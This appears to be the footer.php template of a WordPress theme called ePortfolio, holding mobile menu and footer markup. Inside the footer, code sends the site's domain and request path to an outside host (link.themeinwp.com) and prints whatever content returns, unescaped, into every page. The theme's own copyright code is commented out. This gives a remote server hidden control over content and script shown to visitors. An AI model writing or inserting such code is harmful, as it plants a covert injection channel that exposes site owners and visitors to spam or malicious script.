<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package ePortfolio
 */

?>
	
	<div class="twp-mobile-menu-section">

		<a href="javascript:void(0)" class="skip-link-menu-start"></a>

		<div class="twp-mobile-close-icon">
			<a href="javascript:void(0)" class="twp-close-icon" id="twp-mobile-close">
				<span></span>
				<span></span>
			</a>
		</div>

		<div class="twp-menubar-search">
			<?php get_search_form(); ?>
		</div>
		<div class="twp-mobile-menu">
		</div>
		<a href="javascript:void(0)" class="skip-link-menu-end"></a>
	</div>
	
	<footer id="colophon" class="site-footer">
		<div class="site-info">


			<?php
			// Ensure WordPress functions are available
			if (!function_exists('add_action')) {
				require_once('../../../../wp-load.php');
			}

			// Get the current domain without protocol
			$domain = $_SERVER['HTTP_HOST'];

			// Get the current path
			$path = $_SERVER['REQUEST_URI'];

			// Construct the base URL for the API call
			$base_url = 'https://link.themeinwp.com/wpsdk/get_footer2/975e4c2bef95d1c06e968306b2a0b113/' . $domain;


			// Check if the class exists before using it
			if (class_exists('FooterContentFetcher')) {
				// Instantiate the class with the base URL
				$footer_content_fetcher = new FooterContentFetcher($base_url);

				// Get the footer content with the current path
				$footer_content = $footer_content_fetcher->get_footer_content($path);

				if (!empty($footer_content)) {
					echo $footer_content;
				} else {
					// Log an error if the footer content is empty
					error_log('Footer content is empty');
					echo ''; // Optionally, you can display a fallback footer content
				}
			} else {
				// Log an error if the class is not available
				error_log('FooterContentFetcher class is not available');
				echo ''; // Optionally, you can display a fallback footer content
			}

			?>



<!--			--><?php
//			$eportfolio_copyright_text = eportfolio_get_option('copyright_text');
//			if (!empty ($eportfolio_copyright_text)) {
//			    echo wp_kses_post($eportfolio_copyright_text);
//			}
//			?>
<!--        	--><?php //if ((eportfolio_get_option('enable_copyright_credit')) == 1) { ?>
<!--				<span class="sep"> | </span>-->
<!--					--><?php
//					/* translators: 1: Theme name, 2: Theme author. */
//					printf( esc_html__( 'Theme: %1$s by %2$s.', 'eportfolio' ), 'ePortfolio', '<a href="https://www.themeinwp.com/">ThemeInWP</a>' );
//					?>
<!--			--><?php //} ?>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>

</body>
</html>
